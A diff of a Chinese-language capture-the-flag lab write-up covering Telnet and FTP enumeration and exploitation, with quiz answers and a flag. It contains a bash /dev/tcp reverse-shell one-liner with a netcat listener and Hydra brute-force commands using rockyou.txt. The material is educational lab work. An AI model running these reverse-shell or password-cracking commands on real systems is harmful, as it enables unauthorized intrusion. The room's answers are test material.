@@ -440,9 +440,9 @@ Question 6、7：進階掃描 8012端口 `nmap -A -p 8012 -T4 靶機IP`
 
 ---
 
-- 攻擊者端
+- 反制者端
 
-攻擊者主機啟動監聽： `nc -lvnp 4444`
+反制者主機啟動監聽： `nc -lvnp 4444`
 
 使用 nc（Netcat）開啟監聽：
 
@@ -456,16 +456,16 @@ Question 6、7：進階掃描 8012端口 `nmap -A -p 8012 -T4 靶機IP`
 - 目標者端
 
 目標端執行反彈指令（如成功登 telnet 或 shell）:<br>
-`bash -i >& /dev/tcp/[attacker_ip]/4444 0>&1`
+`bash -i >& /dev/tcp/[antiattacker_ip]/4444 0>&1`
 
 | 組件 | 解釋 |
 |:---|:---|
 | `bash -i` | 啟動互動式 bash shell |
-| `>& /dev/tcp/10.10.10.10/4444` | 把 stdout 與 stderr 轉送到 TCP 連線上（這個位置是特殊的 bash 機制） |
+| `>& /dev/tcp/[antiattacker_ip]/4444` | 把 stdout 與 stderr 轉送到 TCP 連線上（這個位置是特殊的 bash 機制） |
 | `0>&1` | 把 stdin 也導向那個連線，形成完整的雙向通訊 |
 
 結果：目標主機會主動「打回你這邊」，你就在你的 Netcat 介面看到一個 shell 🎉<br>
-`Connection received on 10.10.10.10 4444
+`Connection received on [antiattacker_ip] 4444
 bash-5.0$`
 
 <p align="left">
@@ -554,10 +554,187 @@ Question 11：成功在虛擬機上取得 shell，並查看靶機上 flag.txt �
 
 &nbsp;&nbsp;&nbsp;&nbsp; `THM{y0u_g0t_th3_t3ln3t_fl4g}`
 
-
 >> #### Task 8：瞭解 FTP
+- **FTP (File Transfer Protocol)**：
+透過網路傳輸檔案 的通訊協定，採 用戶端-伺服器架構
+
+<details>
+<summary><strong>FTP 如何運作？（使用雙通道）</strong></summary>
+
+| 通道類型 | Port | 功能說明 |
+|:----|:----|:----|
+| Command（命令）通道 | 21 | 傳送指令與伺服器的回應 |
+| Data（資料）通道 | 20 | 負責實際檔案資料的傳輸 |
+
+
+避免指令與資料混在一起，提高效率。<br>
+FTP 採  Client-Server（用戶端－伺服器）模型
+
+---
+
+- FTP 工作流程簡述：
+1. 客戶端對伺服器發起連線
+2. 輸入帳號密碼（或匿名登入）
+3. 開啟工作階段（session）
+4. 使用 FTP 指令操作（如 `ls`, `get`, `put` 等）
+
+---
+
+- 🔧 主動（Active）vs 被動（Passive）
+
+| 模式 | 說明 |
+|:----|:----|
+| Active | 客戶端開啟 port 等伺服器連線（**伺服器主動連回來**） |
+| Passive | 伺服器開啟 port 供客戶端連入（**伺服器被動等連線，較防火牆友善**） |
+
+
+Passive 模式在現代應用中更常見，尤其是在 NAT、防火牆後面時。
+
+</details>
+
+##### 🔐 答題：
+1. What communications model does FTP use?
+   
+   FTP 使用什麼通信模型？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `client-server`
+
+2. What's the standard FTP port?
+   
+   準的 FTP 連接埠是什麼？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `21`
+
+3. How many modes of FTP connection are there?    
+   
+   FTP 連接有幾種模式？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `2`
 
 >> #### Task 9：枚舉 FTP
 
+Question 1 - 3：對靶機執行`nmap -sC -sV -T4 <IP>`掃描
+- `-sC` 使用 Nmap 的預設腳本 (default scripts) 來掃描目標，快速檢查常見弱點
+- `-sV` 掃描指定的 port，並嘗試探測服務版本
+
+<p align="left">
+  <img src="/rooms/images/11_27.png" width="600">
+</p>
+
+- 靶機開放兩個端口
+- ftp 在 21端口上運行，
+- 目標機上所運行的FTP是：vsftpd
+
+Question 4、5嘗試匿名登入 ftp，列出檔案後，`get PUBLIC_NOTICE.txt -`（不加「-」，會直接下載到虛擬機），取得可能使用者名稱：Mike
+
+<p align="left">
+  <img src="/rooms/images/11_28.png" width="600">
+</p>
+
+##### 🔐 答題：
+1. How many ports are open on the target machine? 
+   
+   目標計算機上打開了多少個埠？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `2`(正解為 2，如不行嘗試輸入 1)
+
+2. What port is ftp running on?
+   
+   ftp 在哪個埠上運行？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `21`
+
+3. What variant of FTP is running on it?  
+   
+   它上運行的 FTP 是什麼變體 ？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `vsftpd`
+
+4. What is the name of the file in the anonymous FTP directory?
+
+   它上運行的 FTP 是什麼變體 ？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `PUBLIC_NOTICE.txt`
+
+5. What do we think a possible username
+
+   我們認為可能的使用者名是什麼
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `mike`
+
 >> #### Task 11：利用 FTP
 
+<details>
+<summary><strong>FTP 的安全性問題</strong></summary>
+
+- **所有資料明文傳輸**（帳號、密碼、檔案能被攔截）
+- 因此現今多改用 SFTP 或 FTPS 來加密傳輸
+
+---
+
+-  為什麼 FTP 危險？<br>
+FTP 像 Telnet 一樣，是 「明文傳輸」 協定：
+   - 傳送的帳號、密碼、檔案內容 **沒加密**
+   - 容易被<strong>中間人攻擊（MITM)</strong>攔截
+   - 攻擊者可透過 **ARP 欺騙 + 封包嗅探 獲得敏感資訊**
+
+---
+
+- 在滲透測試中，FTP 很常成為突破口，尤其當存在：
+  - 弱密碼 / 預設密碼
+  - 匿名登入
+  - 未妥善設定權限
+  - 檔案上傳未限制（上傳木馬或反向 shell）
+  - 權限過寬（可瀏覽系統敏感目錄）
+
+- 滲透測試中 FTP 常見用途：
+   - 匿名登入（帳號：anonymous）
+   - 檔案可讀取 / 寫入（未設權限）
+   - 機密資訊洩露（憑證、設定檔、shell script）
+   - 作為攻擊者上傳反向 shell 的跳板
+
+---
+
+- 某些舊版 FTP 服務在未登入前，執行 cwd（切換目錄）時會回應不同錯誤訊息。<br>
+- 如果 cwd 回應成功，就代表該使用者目錄存在 → 可能是有效帳號。<br>
+- 雖然這是舊漏洞（legacy），但在靶機或真實環境中仍有機會遇到。
+
+---
+
+- 爆破密碼：<br>
+很多 FTP 預設帳密沒改過（如 admin:admin）<br>
+沒加密、沒防爆破 → 很適合用來練手暴力破解！
+
+</details>
+
+**Hydra：密碼爆破工具**<br>
+
+爆破 FTP 密碼（單帳號）範例：
+`hydra -l dale -P /usr/share/wordlists/rockyou.txt -vV ftp://10.10.10.6`
+
+爆破 SSH（多帳號）範例：
+`hydra -L users.txt -P passwords.txt -vV ssh://10.10.10.6`
+
+| 參數 | 說明 |
+|:----|:----|
+| `-l <帳號>` | 指定一個帳號（單一帳號測試） |
+| `-L <檔案>` | 指定帳號清單檔案（多個帳號爆破） |
+| `-p <密碼>` | 指定一個密碼（單一密碼測試） |
+| `-P <檔案>` | 指定密碼清單檔案（多個密碼爆破） |
+| `-C <檔案>` | 指定帳號:密碼格式的清單檔案（login:pass 格式） |
+| `-t 4` | 每個目標開幾個連線並行（預設 16，可調整） |
+| `-s <port>` | 指定非預設 port（例如 FTP 改其他 port） |
+| `-e nsr` | 嘗試 null 密碼 (n)、帳號=密碼 (s)、反轉 (r) |
+| `-vV` | 超詳細輸出，每一組帳密都顯示 |
+| `-f` | 找到就停止（單一目標） |
+| `-F` | 找到就停止（多目標） |
+| `-o <檔案>` | 將成功結果寫入檔案 |
+
+---
+
+Question 1：用`hydra`爆破密碼<br>
+`hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV [目標IP] ftp`
+
+<p align="left">
+  <img src="/rooms/images/11_29.png" width="600">
+</p>
